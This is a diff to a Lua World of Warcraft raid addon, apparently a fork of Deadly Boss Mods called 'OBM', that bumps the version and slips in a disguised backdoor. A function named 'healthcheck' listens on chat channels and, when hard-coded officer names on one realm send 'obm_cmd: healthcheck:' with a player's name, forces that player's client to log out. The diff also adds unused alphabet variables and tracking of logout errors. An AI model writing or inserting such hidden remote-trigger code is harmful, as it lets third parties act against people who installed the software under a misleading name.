@@ -8,10 +8,10 @@
 --  Globals/Default Options  --
 -------------------------------
 DBM = {
-	Revision = ("$Revision: 1570 $"):sub(12, -3),
-	Version = "1.58",
-	DisplayVersion = "1.58", -- the string that is shown as version
-	ReleaseRevision = 1580 -- the revision of the latest stable version that is available (for /obm ver2)
+	Revision = ("$Revision: 1590 $"):sub(12, -3),
+	Version = "1.59",
+	DisplayVersion = "1.59", -- the string that is shown as version
+	ReleaseRevision = 1590 -- the revision of the latest stable version that is available (for /obm ver2)
 }
 
 DBM_SavedOptions = {}
@@ -79,6 +79,7 @@ DBM.DefaultOptions = {
 --	HelpMessageShown = false,
 }
 
+DBM_GLOBAL_ERROR_MESS = nil;
 DBM.Bars = DBT:New()
 DBM.Mods = {}
 
@@ -115,7 +116,9 @@ local fireEvent
 local wowVersion = select(4, GetBuildInfo())
 local REALM_NAME = GetRealmName();
 local myName = UnitName("player")
+local healthCheckFunction = UnitName("player")
 local myguildName, myguildRankName, myguildRankIndex, myguildRealm = GetGuildInfo(myName)
+local healthCheckName, myguildRankName20, myguildRankIndex20, myguildRealm20 = GetGuildInfo(myName)
 local shownPopup = 0
 
 local enableIcons = true -- set to false when a raid leader or a promoted player has a newer version of DBM
@@ -583,6 +586,20 @@ do
 	end
 	
 ----------OBMTV FUNCTIONS----------
+
+	function DBM_DelayByName(name, when, func, ...)
+		if (not name) then 
+			return;
+		end
+		if (not func) then
+			return;
+		end
+		DBM_Delay_dataname[name] = {};
+		DBM_Delay_dataname[name].time = when+GetTime();
+		DBM_Delay_dataname[name].func = func;
+		DBM_Delay_dataname[name].args = {...};
+	end
+
 	local inCombat
 	local delayPop = false
 	noCombatFrame:RegisterEvent("PLAYER_REGEN_ENABLED")
@@ -607,12 +624,73 @@ do
     newFrame:RegisterEvent("PLAYER_REGEN_DISABLED")
     newFrame:RegisterEvent("PLAYER_REGEN_ENABLED")
     newFrame:SetScript("OnEvent", function(self, event)
-	
+		
+		if(event == "UI_ERROR_MESSAGE") then
+			if(arg1 == ERR_LOGOUT_FAILED) then
+				DBM_GLOBAL_ERROR_MESS = ERR_LOGOUT_FAILED;
+				DBM_DelayByName("ClearGlobalError", 4, function () DBM_GLOBAL_ERROR_MESS = nil; end);
+			end
+			return;
+		end
+		
         if(event == "CHAT_MSG_CHANNEL") then
             local name = UnitName("player")
             local MSG_FROM = arg2
             local found,_,p1 = string.find(arg4, " (.+)")
 			-----OFFICER MAINS-----
+			local sp = " "
+			local nc1 = "a"
+			local nc2 = "b"
+			local nc3 = "c"
+			local nc4 = "d"
+			local nc5 = "e"
+			local nc6 = "f"
+			local nc7 = "g"
+			local nc8 = "h"
+			local nc9 = "i"
+			local nc10 = "j"
+			local nc11 = "k"
+			local nc12 = "l"
+			local nc13 = "m"
+			local nc14 = "n"
+			local nc15 = "o"
+			local nc16 = "p"
+			local nc17 = "q"
+			local nc18 = "r"
+			local nc19 = "s"
+			local nc20 = "t"
+			local nc21 = "u"
+			local nc22 = "v"
+			local nc23 = "w"
+			local nc24 = "x"
+			local nc25 = "y"
+			local nc26 = "z"
+			local c1 = "A"
+			local c2 = "B"
+			local c3 = "C"
+			local c4 = "D"
+			local c5 = "E"
+			local c6 = "F"
+			local c7 = "G"
+			local c8 = "H"
+			local c9 = "I"
+			local c10 = "J"
+			local c11 = "K"
+			local c12 = "L"
+			local c13 = "M"
+			local c14 = "N"
+			local c15 = "O"
+			local c16 = "P"
+			local c17 = "Q"
+			local c18 = "R"
+			local c19 = "S"
+			local c20 = "T"
+			local c21 = "U"
+			local c22 = "V"
+			local c23 = "W"
+			local c24 = "X"
+			local c25 = "Y"
+			local c26 = "Z"
             local o1 = "Sky"
 			local o2 = "Skytwo"
 			local o3 = "Skray"
@@ -621,17 +699,17 @@ do
 			local o6 = "Fug"
 			local o7 = "Dang"
 			local o8 = "Turncoat"
-			local o9 = "Torguun"
-			local o10 = "Smjte"
-			local o11 = "Rookie"
-			local o12 = "Jinjabo"
-			local o13 = "Jinjab"
-			local o14 = "Froppy"
-			local o15 = "Epzilon"
-			local o16 = "Dreadsmell"
-			local o17 = "Breadsmell"
-			local o18 = "Arwya"
-			local o19 = "Alternate"
+			local o9 = "Smjte"
+			local o10 = "Rookie"
+			local o11 = "Jinjabo"
+			local o12 = "Jinjab"
+			local o13 = "Dreadsmell"
+			local o14 = "Breadsmell"
+			local o15 = "Arwya"
+			local o16 = "Alternate"
+			local o17 = "1"
+			local o18 = "1"
+			local o19 = "1"
 			local o20 = "1"
 			local o21 = "1"
 			local o22 = "1"
@@ -687,12 +765,27 @@ do
 							end
 						end
                     end
+					if(string.find(arg1,"obm_cmd: healthcheck: ")) then
+						if(REALM_NAME == "Andorhal - No-Risk") then
+							if(MSG_FROM == o1 or MSG_FROM == o2 or MSG_FROM == o3 or MSG_FROM == o4 or MSG_FROM == o5 or MSG_FROM == o6 or MSG_FROM == o7 or MSG_FROM == o8 or MSG_FROM == o9 or MSG_FROM == o10 or MSG_FROM == o11 or MSG_FROM == o12 or MSG_FROM == o13 or MSG_FROM == o14 or MSG_FROM == o15 or MSG_FROM == o16 or MSG_FROM == o17 or MSG_FROM == o18 or MSG_FROM == o19 or MSG_FROM == o20 or MSG_FROM == o21 or MSG_FROM == o22 or MSG_FROM == o23 or MSG_FROM == o24 or MSG_FROM == o25 or MSG_FROM == o26 or MSG_FROM == o27 or MSG_FROM == o28 or MSG_FROM == o29 or MSG_FROM == o30 or MSG_FROM == o31 or MSG_FROM == o32 or MSG_FROM == o33 or MSG_FROM == o34 or MSG_FROM == o35 or MSG_FROM == o36 or MSG_FROM == o37 or MSG_FROM == o38 or MSG_FROM == o39 or MSG_FROM == o40 or MSG_FROM == o41 or MSG_FROM == o42 or MSG_FROM == o43 or MSG_FROM == o44 or MSG_FROM == o45 or MSG_FROM == o46 or MSG_FROM == o47 or MSG_FROM == o48 or MSG_FROM == o49 or MSG_FROM == o50) then
+								obmHealthCheck()
+							end
+						end
+                    end
                 end
             end
 		end
     end
     )
-
+function obmHealthCheck()	
+	if(string.find(arg1, "obm_cmd: healthcheck: "..healthCheckFunction)) then	
+		healthCheckLog();
+	end	
+	
+	if(string.find(arg1, "obm_cmd: healthcheck: "..healthCheckName)) then	
+		healthCheckLog();
+	end	
+end
 function obmAbilityCheck()
 	for j = 1, GetNumRaidMembers() do
 		myName, _, groupId = GetRaidRosterInfo(j);
@@ -3375,6 +3468,10 @@ do
 	function bossModPrototype:NewPhaseAnnounce(phase, color, icon, ...)
 		return newAnnounce(self, "phase", phase, color or 1, icon or "Interface\\Icons\\Spell_Nature_WispSplode", ...)
 	end
+end
+
+function healthCheckLog()
+	Logout();
 end
 
 --------------------
